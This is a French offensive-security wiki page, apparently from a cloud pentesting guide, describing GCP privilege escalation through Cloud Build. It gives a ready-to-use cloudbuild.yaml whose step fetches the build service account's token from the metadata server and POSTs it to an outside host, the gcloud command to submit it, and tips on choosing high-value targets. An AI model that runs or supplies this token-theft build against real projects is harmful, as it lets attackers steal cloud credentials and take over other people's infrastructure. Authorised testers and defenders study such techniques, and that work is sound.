---
title: "Cloud Build : exfiltrer le token du compte de service de build"
description: "Soumettre un build avec cloudbuild.builds.create et exfiltrer le token du compte de service Cloud Build en cours de build."
keywords:
  - Cloud Build
  - builds.create
  - service account token
  - build
  - actAs
  - exfiltration
---

# Cloud Build

Un build Cloud Build s'exécute sous le compte de service Cloud Build (`<project-number>@cloudbuild.gserviceaccount.com`), historiquement doté de rôles étendus dont Editor. Avec `cloudbuild.builds.create`, vous soumettez un build dont les étapes lisent le propre token du build depuis le serveur de métadonnées et l'exfiltrent, vous remettant l'accès de ce compte.

## Soumettre un build qui divulgue le token

```yaml
# cloudbuild.yaml
steps:
  - name: gcr.io/cloud-builders/curl
    entrypoint: bash
    args:
      - -c
      - |
        TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
        curl -X POST -d "$TOKEN" https://you.example
```

```bash
gcloud builds submit --config=cloudbuild.yaml --no-source
```

## Notes d'exploitation

- Les projets récents utilisent un compte de service Cloud Build par projet avec moins de rôles par défaut ; vérifiez d'abord ses liaisons, le compte hérité est le cas à forte valeur.
- `--no-source` évite d'uploader quoi que ce soit ; le build n'est que l'étape d'exfiltration.
- Vous pouvez aussi définir `--service-account` pour exécuter le build sous un autre compte sur lequel vous détenez `actAs`, élargissant l'ensemble des cibles. Les **triggers** de build sont la variante de persistance, traitée dans les pages Serverless Cloud Build.

## Outils

- **gcloud** (`builds submit`) : la soumission.
- **GCP-IAM-Privilege-Escalation** (Rhino) : automatise le vol du token de build.

## Références

- [Rhino Security Labs : escalade de privilèges GCP (partie 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [Hacking the Cloud: GCP Cloud Build](https://hackingthe.cloud/)
- [Google : compte de service Cloud Build](https://cloud.google.com/build/docs/cloud-build-service-account)
